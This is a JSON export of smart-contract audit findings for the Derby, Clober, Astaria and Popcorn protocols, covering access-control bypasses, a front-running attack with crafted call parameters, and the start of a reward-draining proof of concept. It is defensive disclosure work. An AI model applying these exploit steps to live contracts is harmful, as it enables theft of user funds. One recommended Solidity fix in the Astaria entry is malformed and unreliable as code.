`trustedRemoteConnext` mapping.\n\nAccording to the description of the project, it'll be deployed on the following networks:\n> Mainnet, Arbitrum, Optimism, Polygon, Binance Smart Chain\n\nAnd this is the [list of networks supported by Connext](https://docs.connext.network/resources/supported-chains):\n> Ethereum Mainnet\n> Polygon\n> Optimism\n> Arbitrum One\n> Gnosis Chain\n> BNB Chain\n\nThus, a malicious actor can send a message from Gnosis Chain (it's not supported by Derby), and the `onlySource` modifier will pass the message. The same is true for any new network supported by Connext in the future and not supported by Derby.\n## Impact\nA malicious actor can call `XProvider.xReceive` and any functions of `XProvider` with the `onlySelf` modifier:\n1. [xReceive](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XProvider.sol#L170) allow the caller to call any public function of `XProvider`, but only the ones with the `onlySelf` modifier are authorized;\n1. [receiveAllocations](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XProvider.sol#L204) can be used to corrupt allocations in the `XChainController` (i.e. allocate all tokens only to the protocol the attacker will benefit the most from);\n1. [receiveTotalUnderlying](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XProvider.sol#L254) can be used to set wrong \"total underlying\" value in the `XChainController` and block rebalancing of vaults (due to an underflow or another arithmetical error);\n1. [receiveSetXChainAllocation](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XProvider.sol#L305) can be used to set an exchange rate that will allow an attacker to drain a vault by redeeming their LP tokens at a higher rate;\n1. [receiveFeedbackToXController](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XProvider.sol#L351) can be used to trick the `XChainController` into skipping receiving of funds from a vault;\n1. [receiveProtocolAllocationsToVault](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XProvider.sol#L420) can be used by an attacker to unilaterally set allocations in a vault, directing funds only to protocol the attacker will benefit from;\n1. [receiveRewardsToGame](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XProvider.sol#L452) can be used by an attacker to increase the reward per LP token in a protocol the attacker deposited to;\n1. finally, [receiveStateFeedbackToVault](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XProvider.sol#L482) can allow an attacker to switch off a vault and exclude it from rebalancing.\n## Code Snippet\n1. `onlySource` modifier validates the message sender:\nhttps://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XProvider.sol#L85-L88\n1. `xReceive` is protected by the `onlySource` modifier:\nhttps://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XProvider.sol#L170-L180\n1. Connext always tries the fast path and sets the sender address to the zero address:\nhttps://github.com/connext/monorepo/blob/87b75b346664271522e2f2acfd10bebcfeb93993/packages/deployments/contracts/contracts/core/connext/facets/BridgeFacet.sol#L878\n## Tool used\nManual Review\n## Recommendation\nIn the `onlySource` modifier, consider checking that `trustedRemoteConnext[_origin]` doesn't return the zero address:\n```diff\ndiff --git a/derby-yield-optimiser/contracts/XProvider.sol b/derby-yield-optimiser/contracts/XProvider.sol\nindex 6074fa0..f508a7c 100644\n--- a/derby-yield-optimiser/contracts/XProvider.sol\n+++ b/derby-yield-optimiser/contracts/XProvider.sol\n@@ -83,7 +83,7 @@ contract XProvider is IXReceiver {\n    *    3) The call to this contract comes from Connext.\n    */\n   modifier onlySource(address _originSender, uint32 _origin) {\n-    require(_originSender == trustedRemoteConnext[_origin] && msg.sender == connext, \"Not trusted\");\n+    require(trustedRemoteConnext[_origin] != address(0) && _originSender == trustedRemoteConnext[_origin] && msg.sender == connext, \"Not trusted\");\n     _;\n   }\n```\n\n\n\n## Discussion\n\n**Jeiwan**\n\nEscalate for 10 USDC\n\nThis was mistakenly marked as a duplicate.\n\nThis report points at the weak cross-chain messages authentication, which allows an attacker to send fake cross-chain messages and pass the authentication check. This basically disrupts the rebalancing and allows the attacker to manipulate token allocations for their profit (and for the loss of everyone else) or even lock rebalancing indefinitely.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> This was mistakenly marked as a duplicate.\n> \n> This report points at the weak cross-chain messages authentication, which allows an attacker to send fake cross-chain messages and pass the authentication check. This basically disrupts the rebalancing and allows the attacker to manipulate token allocations for their profit (and for the loss of everyone else) or even lock rebalancing indefinitely.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Theezr**\n\nValid high issue\n\n\n**hrishibhat**\n\nEscalation accepted\n\nThis is a valid high issue\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> This is a valid high issue\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about a vulnerability found in the XProvider contract which is used to manage interactions between vaults deployed on different networks. The vulnerability is that the contract does not check that the sender of the cross-chain message is trusted. This can be exploited by a malicious actor to send a message from an untrusted network and bypass the authentication check. \n\nThe impact of this vulnerability is that the malicious actor can call any function of the XProvider contract that is protected by the onlySource modifier. This can be used to corrupt allocations in the XChainController, set wrong \"total underlying\" values, trick the XChainController into skipping receiving of funds from a vault, set allocations in a vault, increase the reward per LP token in a protocol, and switch off a vault. \n\nThe code snippet that is relevant to this vulnerability is the onlySource modifier, which validates the message sender, and the xReceive function, which is protected by the onlySource modifier. Additionally, Connext always tries the fast path and sets the sender address to the zero address.\n\nTo fix this vulnerability, the onlySource modifier should check that the trustedRemoteConnext does not return the zero address.\n\nThe tool used for this bug report was manual review.",
      "report_date": {},
      "contest_prize_txt": "50000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/13",
      "sponsor_name": "Derby",
      "sponsor_link": "",
      "quality_score": 4,
      "general_score": 2,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-derby-judging/issues/309",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "13",
      "slug": "h-6-cross-chain-message-authentication-can-be-bypassed-allowing-an-attacker-to-disrupt-the-state-of-vaults-sherlock-derby-derby-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Derby",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Derby",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "RWA"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "12227",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "18",
      "title": "H-1: pushVaultAmounts can be called multiple times if in the right state",
      "content": "Source: https://github.com/sherlock-audit/2023-01-derby-judging/issues/31 \n\n## Found by \ncergyk\n\n## Summary\nIn `XChainController`, `pushVaultAmounts` can be called multiple times on same vault, \ncalling `sendXChainAmount` and sending funds cross chain multiple times and breaking protocol accounting.   \n\n## Vulnerability Detail\nIn `XChainController`, pushVaultAmounts:\nhttps://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XChainController.sol#L295-L324\n\ncan be called by anybody and does not check it has already been called with current allocations, which means that it will execute its action every time it is called. \n\n## Impact\nProtocol accounting is completely broken as a result, leading to funds being stuck on a chain due to being unaccounted for\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\nCache the allocations on which `pushVaultAmount` has already been called, so only the difference is forwarded cross chain, or find a way to check if a cross chain action has already been sent.",
      "summary": "\nThis bug report is about an issue found in the XChainController of the Sherlock Audit project. The issue is that the function pushVaultAmounts can be called multiple times on the same vault, which can lead to funds being sent cross chain multiple times and breaking protocol accounting. Manual review was used to discover the issue. The impact of this issue is that the protocol accounting is completely broken, leading to funds being stuck on a chain due to being unaccounted for. The recommendation is to cache the allocations on which pushVaultAmount has already been called, so only the difference is forwarded cross chain, or to find a way to check if a cross chain action has already been sent.",
      "report_date": {},
      "contest_prize_txt": "50000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/13",
      "sponsor_name": "Derby",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-derby-judging/issues/31",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "13",
      "slug": "h-1-pushvaultamounts-can-be-called-multiple-times-if-in-the-right-state-sherlock-derby-derby-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Derby",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Derby",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "RWA"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "7264",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "MEDIUM",
      "finders_count": 5,
      "protocol_id": "39",
      "title": "DAO fees potentially unavailable due to overly strict access control",
      "content": "## Audit Report\n\n## Severity: Medium Risk\n\n### Context\nOrderBook.sol#L790\n\n### Description\nThe `collectFees` function is guarded by an inline access control require statement condition which prevents anyone, except a host, from invoking the function. Only the host of the market is authorized to invoke, effectively delivering all collected fees, including the part of the fees belonging to the DAO.\n\n```solidity\nfunction collectFees() external nonReentrant {\n    require(msg.sender == _host(), Errors.ACCESS); // @audit only host authorized\n    if (_baseFeeBalance > 1) {\n        _collectFees(_baseToken, _baseFeeBalance - 1);\n        _baseFeeBalance = 1;\n    }\n    if (_quoteFeeBalance > 1) {\n        _collectFees(_quoteToken, _quoteFeeBalance - 1);\n        _quoteFeeBalance = 1;\n    }\n}\n```\n\nThis access control is too strict and can lead to funds being locked permanently in the worst-case scenario. As the host is a single point of failure, if access to the wallet is lost or is incorrectly transferred, the fees for both the host and the DAO will be locked.\n\n### Recommendation\nIt is recommended to remove the access control from the `collectFees` function, as collected fees are transferred to fixed addresses being the host and the treasury. In such a setup, anyone should be able to invoke the function and trigger collected fees delivery at any time, and it should not be limited only to the host of the market.\n\n### Clober\nFixed in PR 315.\n\n### Spearbit\nVerified. Authorization modified. Everyone can trigger the function.",
      "summary": "\nThis bug report is about the collectFees function in the OrderBook.sol code. This function was guarded by an inline access control require statement condition which only allowed the host of the market to invoke it, effectively delivering all collected fees, including the part of the fees belonging to the DAO. This access control was too strict and could lead to funds being locked permanently in the worst case scenario. As the host is a single point of failure, it was recommended to remove the access control from the collectFees function so that anyone could trigger the function and deliver collected fees at any time. This bug was fixed in PR 315, and authorization was modified so that everyone can trigger the function.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Clober-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 3,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Clober-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Clober-Spearbit-Security-Review.pdf",
      "pdf_page_from": 19,
      "contest_id": "",
      "slug": "dao-fees-potentially-unavailable-due-to-overly-strict-access-control-spearbit-clober-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "CLOBER",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "CLOBER",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "7301",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "HIGH",
      "finders_count": 4,
      "protocol_id": "41",
      "title": "Anyone can take a loan out on behalf of any collateral holder at any terms",
      "content": "## Security Vulnerability Report\n\n## Severity\n**High Risk**\n\n## Context\n`VaultImplementation.sol#L225`\n\n## Description\nIn the `_validateCommitment()` function, the initial checks are intended to ensure that the caller who is requesting the lien is someone who should have access to the collateral that it's being taken out against. The caller also inputs a receiver, who will be receiving the lien. \n\nIn this validation, this receiver is checked against the collateral holder, and the validation is approved in the case that `receiver == holder`. However, this does not imply that the collateral holder wants to take this loan.\n\nThis opens the door to a malicious lender pushing unwanted loans on holders of collateral by calling `commitToLien` with their `collateralId`, as well as their address set to the receiver. This will pass the `receiver == holder` check and execute the loan.\n\nIn the best case, the borrower discovers this and quickly repays the loan, incurring a fee and a small amount of interest. In the worst case, the borrower doesn't know this happens, and their collateral is liquidated.\n\n## Recommendation\nOnly allow calls from the holder or operator to lead to valid commitments:\n\n```solidity\naddress holder = CT.ownerOf(collateralId);\naddress operator = CT.getApproved(collateralId);\n\nif (\n    msg.sender != holder &&\n    receiver != holder &&\n    receiver != operator &&\n    !ROUTER().isValidVault(receiver)\n) {\n    msg.sender != operator &&\n    CT.isApprovedForAll(holder, msg.sender)\n) {\n    if (operator != address(0)) {\n        require(operator == receiver);\n    } else {\n        require(CT.isApprovedForAll(holder, receiver));\n    }\n} else {\n    revert NotApprovedForBorrow();\n}\n```",
      "summary": "\nThis bug report is about the VaultImplementation.sol#L225 function called validateCommitment(). This function is intended to ensure that the caller who is requesting the lien has access to the collateral. The caller also inputs a receiver who will receive the lien. The receiver is checked against the collateral holder, and the validation is approved if they match. \n\nHowever, this does not imply that the collateral holder wants to take the loan. This opens the door to a malicious lender pushing unwanted loans on holders of collateral by calling commitToLien with their collateralId, as well as their address set to the receiver. This will pass the receiver == holder check and execute the loan. \n\nIn the best case, the borrower discovers this and quickly repays the loan, incurring a fee and small amount of interest. In the worst case, the borrower doesn't know this happens and their collateral is liquidated. \n\nThe recommendation is to only allow calls from the holder or operator to lead to valid commitments. The msg.sender should be checked against the holder, operator, and receiver. If the sender is not the holder, operator, or receiver, then the CT.isApprovedForAll(holder, msg.sender) should be checked. If none of these checks pass, then the loan should be reverted with the NotApprovedForBorrow() message.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Astaria-Spearbit-Security-Review.pdf",
      "pdf_page_from": 27,
      "contest_id": "",
      "slug": "anyone-can-take-a-loan-out-on-behalf-of-any-collateral-holder-at-any-terms-spearbit-astaria-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "Astaria",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "Astaria",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "RWA"
            },
            "score": 1
          },
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Lending"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "7286",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "HIGH",
      "finders_count": 4,
      "protocol_id": "41",
      "title": "VaultImplementation.buyoutLien can be DoSed by calls to LienToken.buyoutLien",
      "content": "## Vulnerability Report\n\n## Severity: High Risk\n\n### Context\n- LienToken.sol#L102\n- LienToken.sol#L121\n- VaultImplementation.sol#L305\n\n### Description\nAnyone can call into `LienToken.buyoutLien` and provide params of the type `LienActionBuyout`:  \n`params.incoming` is not used, so for example, vault signatures or strategy validation is skipped. There are a few checks for `params.encumber`.\n\nLet's define the following variables:\n\n| Parameter | Value |\n|-----------|-------|\n| i         | params.position |\n| kj        | params.encumber.stack[j].point.position |\n| tj        | params.encumber.stack[j].point.last |\n| ej        | params.encumber.stack[j].point.end |\n| e0       | itnow+D0 |\n| i         | lj params.encumber.stack[j].point.lienId |\n| l0       | ih(N0 i,V0 i,S0 i,c0 i, (A0max i,r0 i,D0 i,P0 i,L0 i)) where h is the keccak256 of the encoding |\n| rj        | params.encumber.stack[j].lien.details.rate : old rate |\n| r0       | params.encumber.lien.details.rate : new rate |\n| c         | params.encumber.collateralId |\n\n| Parameter | Value |\n|-----------|-------|\n| cj        | params.encumber.stack[j].lien.collateralId |\n| c0       | params.encumber.lien.collateralId |\n| Aj        | params.encumber.stack[j].point.amount |\n| A0       | params.encumber.amount |\n| Amax     | params.encumber.stack[j].lien.details.maxAmount |\n| A0max    | params.encumber.lien.details.maxAmount |\n| R         | params.encumber.receiver |\n| Nj        | params.encumber.stack[j].lien.token |\n| N0       | params.encumber.lien.token |\n| Vj        | params.encumber.stack[j].lien.vault |\n| V0       | params.encumber.lien.vault |\n| Sj        | params.encumber.stack[j].lien.strategyRoot |\n| S0       | params.encumber.lien.strategyRoot |\n| Dj        | params.encumber.stack[j].lien.details.duration |\n| D0       | params.encumber.lien.details.duration |\n| Pj        | params.encumber.stack[j].lien.details.maxPotentialDebt |\n| P0       | params.encumber.lien.details.maxPotentialDebt |\n| Lj        | params.encumber.stack[j].lien.details.liquidationInitialAsk |\n| L0       | params.encumber.lien.details.liquidationInitialAsk |\n\n| Parameter | Value |\n|-----------|-------|\n| Imin      | AstariaRouter.s.minInterestBPS |\n| Dmin      | AstariaRouter.s.minDurationIncrease |\n| tnow      | block.timestamp |\n| bi        | buyout |\n| o         | _getOwed(params.encumber.stack[params.position], block.timestamp) |\n| oj        | _getOwed(params.encumber.stack[j], params.encumber.stack[j].point.end) |\n| n         | params.encumber.stack.length |\n| O         | o0 + o1 + ... + on -1_getMaxPotentialDebtForCollateral(params.encumber.stack) |\n| sj        | params.encumber.stack[j] |\n| s0        | inewStack |\n\n### Checks and Modifications\nLet's go over the checks and modifications that `buyoutLien` does:\n\n1. `validateStack` is called to make sure that the hash of `params.encumber.stack` matches with `s.collateralStateHash` value of `c`. This is not important and can be bypassed by the exploit even after the fix for Issue 106.\n2. `_createLien` is called next which does the following checks:  \n   2.1. `c` is not up for auction.  \n   2.2. We haven't reached max number of liens, currently set to 5.  \n   2.3. `L0 i * A0 i > 0`  \n   2.4. If `params.encumber.stack` is not empty then `c0 i = c0`.  \n   2.5. We `_mint` a new lien for `R` with id equal to `h(N0 i, V0 i, S0 i, c0 i, (A0max i, r0 i, D0 i, P0 i, L0 i))` where `h` is the hashing mechanism of encoding and then taking the keccak256.  \n   2.6. The new stack slot and the new lien id are returned.\n3. `isValidRefinance` is called which performs the following checks:  \n   3.1. Checks `c0 i = c0`.  \n   3.2. Checks either  \n   `(r0 i < r i - Imin) ^ (e0 i ≥ e i)`  \n   or  \n   `(r0 i ≥ r i) ^ (e0 i ≥ e i + Dmin)`  \n4. Checks where `c0 i` is in auction by checking `s.collateralStateHash`'s value.\n5. Check `O ≤ P0 i`.\n6. Check `A0max i ≥ o`.\n7. Send `wETH` through `TRANSFER_PROXY` from `msg.sender` to `payee` of `li` with the amount of `bi`.\n8. If `payee` of `li` is a public vault, do some bookkeeping by calling `handleBuyoutLien`.\n9. Call `_replaceStackAtPositionWithNewLien` to:\n   - 9.1. Replace `si` with `s0 i` in `params.encumber.stack`.\n   - 9.2. `_burn li`.\n   - 9.3. Delete `s.lienMeta` of `li`.\n\n### Important Checks\nSo in a nutshell, the important checks are:\n- `c`, `c i` are not in auction (not important for the exploit)\n- `c0 i = c0`\n- `n` is less than or equal to the max number of allowed liens (5 currently) (not important for the exploit)\n- `L0 i ≥ A0 i` and `L0 i > 0`\n- `O ≤ P0 i`\n- `A0max i ≥ o`\n- `(r0 i < r i - Imin) ^ (e0 i ≥ e i)`  \n   or  \n   `(r0 i ≥ r i) ^ (e0 i ≥ e i + Dmin)`\n\n### Exploit\nAn attacker can DoS the `VaultImplementation.buyoutLien` as follows:\n\n1. A vault decides to buy out a collateral's lien to offer better terms and so signs a commitment, and someone on behalf of the vault calls `VaultImplementation.buyoutLien`, which if executed would call `LienToken.buyoutLien` with the following parameters:\n   ```javascript\n   LienActionBuyout({\n       incoming: incomingTerms,\n       position: position,\n       encumber: ILienToken.LienActionEncumber({\n           collateralId: collateralId,\n           amount: incomingTerms.lienRequest.amount,\n           receiver: recipient(),\n           lien: ROUTER().validateCommitment({\n               commitment: incomingTerms,\n               timeToSecondEpochEnd: _timeToSecondEndIfPublic()\n           }),\n           stack: stack\n       })\n   })\n   ```\n\n2. The attacker frontruns the call from step 1 and instead provides the following modified parameters to `LienToken.buyoutLien`:\n   ```javascript\n   LienActionBuyout({\n       incoming: incomingTerms, // not important, since it is not used and can be zeroed-out to save tx gas\n       position: position,\n       encumber: ILienToken.LienActionEncumber({\n           collateralId: collateralId,\n           amount: incomingTerms.lienRequest.amount,\n           receiver: msg.sender, // address of the attacker\n           lien: ILienToken.Lien({ // note that the lien here would have the same fields as the original message by the vault rep\n               token: address(s.WETH),\n               vault: incomingTerms.lienRequest.strategy.vault, // address of the vault offering a better term\n               strategyRoot: incomingTerms.lienRequest.merkle.root,\n               collateralId: collateralId,\n               details: details // see below\n           }),\n           stack: stack\n       })\n   })\n   ```\n\nWhere `details` provided by the attacker can be calculated using the following snippet:\n```javascript\nuint8 nlrType = uint8(_sliceUint(commitment.lienRequest.nlrDetails, 0));\n(bytes32 leaf, ILienToken.Details memory details) = IStrategyValidator(\n   s.strategyValidators[nlrType]\n).validateAndParse(\n   commitment.lienRequest,\n   s.COLLATERAL_TOKEN.ownerOf(\n       commitment.tokenContract.computeId(commitment.tokenId)\n   ),\n   commitment.tokenContract,\n   commitment.tokenId\n);\n```\n\nThe result is that:\n- The new `LienId` that was supposed to be `_mint`ed for the `recipient()` of the vault gets minted for the attacker.\n- The call to `VaultImplementation.buyoutLien` would fail since the new `LienId` is already minted, and so the vault would not be able to receive the interests it had anticipated.\n- When there is a payment or Seaport auction settlement, the attacker would receive the funds instead.\n- The attacker can introduce a malicious contract into the protocol that would be `LienToken.ownerOf(newLienId)` without needing to register for a vault.\n\nTo execute this attack, the attacker would need to spend the buyout amount of assets. Also, the attacker does not necessarily need to front-run a transaction to buyout a lien; they can pick their own hand-crafted parameters that would satisfy the conditions in the analysis above to introduce themselves in the protocol.\n\n### Recommendation\nThere are multiple ways to mitigate this issue:\n1. We can restrict the `LienToken.buyoutLien` endpoint to be only called by the registered vaults in `AstariaRouter`.\n2. In `LienToken.buyoutLien`, use `params.incoming` to validate the signatures and lien details.\n\nThe above 2 solutions would prevent an attacker from introducing/minting a new lien id using parameters from a different vault without themselves registering a vault.\n\n**Spearbit:** This is resolved in the following commit by restricting the `buyoutLien` of the `LienToken` to only valid/registered vaults: commit 24da50.",
      "summary": "\nA bug report has been submitted regarding the LienToken.sol and VaultImplementation.sol smart contracts. The bug affects the buyoutLien function in the LienToken.sol contract, which can be exploited to DoS the VaultImplementation.buyoutLien. Anyone can call into the LienToken.buyoutLien and provide parameters of the type LienActionBuyout, with params.incoming not being used. This means that vault signatures or strategy validation is skipped. \n\nThe attacker can frontrun the call from the vault and instead provide modified parameters to the LienToken.buyoutLien. The attacker needs to provide the same fields as the original message by the vault rep, but with the receiver being the attacker. The attacker also needs to provide details of the lien, which can be calculated by using the IStrategyValidator. \n\nThe result is that the newLienId that was supposed to be minted for the ‘recipient()‘ of the vault, gets minted for the attacker. When there is a payment or Seaport auction settlement, the attacker would receive the funds instead. The attacker can intorduces a malicous contract into the protocol that would be LienToken.ownerOf(newLienId) without needing to register for a vault. \n\nTo mitigate this issue, the LienToken.buyoutLien endpoint can be restricted to be only called by the registered vaults in AstariaRouter, and use params.incoming to validate the signatures and lien details. This would prevent an attacker introducing/minting a new lien id using parameters from a different vault without themselves registering a vault. The issue has been resolved in the commit 24da50.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Astaria-Spearbit-Security-Review.pdf",
      "pdf_page_from": 14,
      "contest_id": "",
      "slug": "vaultimplementationbuyoutlien-can-be-dosed-by-calls-to-lientokenbuyoutlien-spearbit-astaria-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "Astaria",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "Astaria",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "RWA"
            },
            "score": 1
          },
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Lending"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "DOS"
          }
        },
        {
          "tags_tag": {
            "title": "Business Logic"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "21994",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "900",
      "title": "[H-09] Attacker can steal 99% of total balance from any reward token in any Staking contract",
      "content": "\n<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110>\n\n<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L483-L503> \n\n<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L296-L315>\n\n<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360> \n\n<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L377-L378>\n\n<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L390-L399>\n\n### Impact\n\nAttacker can steal 99% of the balance of a reward token of any Staking contract in the blockchain. An attacker can do this by modifying the reward speed of the target reward token.\n\nSo an attacker gets access to `changeRewardSpeed`, he will need to deploy a vault using the target Staking contract as its Staking contract. Since the Staking contract is now attached to the attacker's created vault, he can now successfully `changeRewardSpeed`. Now with `changeRewardSpeed`, attacker can set the `rewardSpeed` to any absurdly large amount that allows them to drain 99% of the balance (dust usually remains due to rounding issues) after some seconds (12 seconds in the PoC.)\n\n### Proof of Concept\n\nThis attack is made possible by the following issues:\n\n1.  Any user can deploy a Vault that uses any existing Staking contract - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L108>\n2.  As long as attacker is creator of a Vault that has the target Staking contract attached to it, attacker can call `changeStakingRewardSpeeds` to modify the rewardSpeeds of any reward tokens in the target Staking contract - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L495-L501>\n3.  There are no checks for limits on the `rewardsPerSecond` value in `changeRewardSpeed` so attacker can set any amount they want - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L299-L314>\n4.  `changeRewardSpeed` also uses `_calcRewardsEnd` to get the new `rewardsEndTimestamp` but that calculation is faulty and the new timestamp is always longer than it's supposed to be leading to people being able to claim more rewards than they should get - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360>\n\nBelow is the PoC using a Foundry test:\n\n```solidity\n  function test__steal_rewards_from_any_staking_contract() public {\n    